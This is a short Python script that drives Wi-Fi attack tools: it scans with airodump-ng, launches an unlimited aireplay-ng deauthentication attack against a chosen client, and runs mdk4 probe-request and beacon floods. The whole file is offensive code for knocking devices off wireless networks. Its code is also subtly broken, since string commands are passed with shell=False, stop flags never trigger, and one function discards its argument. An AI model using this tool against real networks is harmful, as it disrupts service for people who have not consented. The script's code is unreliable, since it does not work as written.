import time
import subprocess
import random
import string
def scan_wifi(interface):
    subprocess.Popen(f"sudo airodump-ng {interface} --write data/wifi_scan{time.strftime('%Y%m%d_%H%M%S')} --output-format csv", shell=False)
    time.sleep(30)  # Scan for 30 seconds
    subprocess.Popen("sudo pkill airodump-ng", shell=False)
    # The scan results will be saved in wifi_scan-01.csv
def deauth(target_bssid, interface):
    turn_off = False
    if target_bssid.lower() == "":
        subprocess.Popen(f"sudo aireplay-ng --deauth 0 -c {interface}", shell=False)
    else:
        subprocess.Popen(f"sudo aireplay-ng --deauth 0 -c {target_bssid} {interface}", shell=False)
    if turn_off == True:
        subprocess.Popen("sudo pkill aireplay-ng", shell=False)
def probe_request_flood(ssid_prefix, interface):
    turn_off = False
    subprocess.Popen(f"sudo mdk4 {interface} p -s {ssid_prefix} -c 1", shell=False)
    if turn_off == True:
        subprocess.Popen("sudo pkill mdk4", shell=False)
def beacon_flood(ssid_prefix, interface):
    turn_off = False
    ssid_prefix = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    subprocess.Popen(f"sudo mdk4 {interface} bv -s {ssid_prefix} -c 1", shell=False)
    if turn_off == True:
        subprocess.Popen("sudo pkill mdk4", shell=False)